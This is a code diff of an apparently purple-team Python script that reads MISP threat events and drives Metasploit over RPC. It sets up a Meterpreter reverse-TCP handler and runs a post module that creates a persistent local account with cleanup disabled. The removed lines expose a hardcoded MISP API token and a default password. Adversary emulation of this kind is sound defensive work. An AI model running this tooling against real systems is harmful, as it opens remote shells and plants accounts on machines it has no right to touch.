@@ -3,15 +3,27 @@ import json
 import jmespath
 from pymetasploit3.msfrpc import MsfRpcClient
 from tenacity import retry, stop_after_delay, wait_fixed
+import yaml
 
-msf_server = "127.0.0.1"
-msf_password = "metasploit"
+with open('config.yml', 'r') as file:
+    config = yaml.safe_load(file)
+
+MSF_SERVER = config['msf']['server']
+MSF_PASSWORD = config['msf']['password']
+MSF_RPC_PORT = config['msf']['rpc_port']
+MSF_LHOST = config['msf']['LHOST']
+MSF_LPORT = config['msf']['LPORT']
+MISP_URL = config['misp']['url']
+MISP_TOKEN = config['misp']['api_token']
+
+main_msf_session_key = 1
+main_msf_session = None
 
 # Initialize MSF Connection
 @retry(wait=wait_fixed(5))
 def init_msf():
     try :
-        client = MsfRpcClient(msf_password, port='55553', server=msf_server, ssl=True)
+        client = MsfRpcClient(MSF_PASSWORD, port=MSF_RPC_PORT, server=MSF_SERVER, ssl=True)
         print("[*]  Connected to Metasploit")
         return client
     except Exception as e:
@@ -22,10 +34,8 @@ def init_msf():
 # Initialize MISP Connection
 @retry(wait=wait_fixed(5))
 def init_misp():
-    misp_url = "http://localhost"
-    misp_token="7uSxM3tnnyUfFGcPFqp1O92P90LsK6au3bFgVrPi"
     try:
-        misp = PyMISP(misp_url, misp_token)
+        misp = PyMISP(MISP_URL, MISP_TOKEN)
         print("[*]  Connected to MISP")
         return misp
     except Exception as e:
@@ -52,6 +62,8 @@ def read_misp_event(misp, event_id):
     for item in galaxy_clusters:
         print(f"{item['value']}")
 
+        # purple
+
     # Get malware samples
     print()
     print("[*] Found below Malware Samples")
@@ -65,8 +77,8 @@ def meterpreter_connect(client):
     print("[*] Configuring Metasploit Exploit...")
     exploit = client.modules.use('exploit', 'multi/handler')
     payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
-    payload['LHOST'] = '192.168.56.3'
-    payload['LPORT'] = '6001'
+    payload['LHOST'] = MSF_LHOST
+    payload['LPORT'] = MSF_LPORT
 
     console_id = client.consoles.console().cid
     console = client.consoles.console(console_id)
@@ -76,16 +88,27 @@ def meterpreter_connect(client):
     print()
     print("[*] Running shell commands:\n")
     sessions = client.sessions.list
-    session_1_key = list(sessions.keys())[0]
-    session_1 = sessions[session_1_key]
-    print(f"[*] Selecting Session {session_1_key}")
-    shell = client.sessions.session(session_1_key)
-    print(shell.run_shell_cmd_with_output("net accounts", None))  
+    main_msf_session_key = list(sessions.keys())[0]
+    main_msf_session = sessions[main_msf_session_key]
+    print(f"[*] Selecting Session {main_msf_session_key}")
+    shell = client.sessions.session(main_msf_session_key)
+    # print(shell.run_shell_cmd_with_output("net accounts", None))  
+
+def run_t1136(client):
+    exploit = client.modules.use('post', 'windows/purple/t1136')
+    exploit['SESSION'] = main_msf_session_key
+    exploit['USERNAME'] = "test-t1136"
+    exploit['CLEANUP'] = False
+    console_id = client.consoles.console().cid
+    console = client.consoles.console(console_id)
+    console.run_module_with_output(exploit)
+
 
 def main():
-    msf_client = init_msf()
+    # msf_client = init_msf()
     misp_client = init_misp()
-    read_misp_event(misp_client, 4)
-    meterpreter_connect(msf_client)
+    misp_event_id = 4
+    read_misp_event(misp_client, misp_event_id)
+    # meterpreter_connect(msf_client)
 
 main()
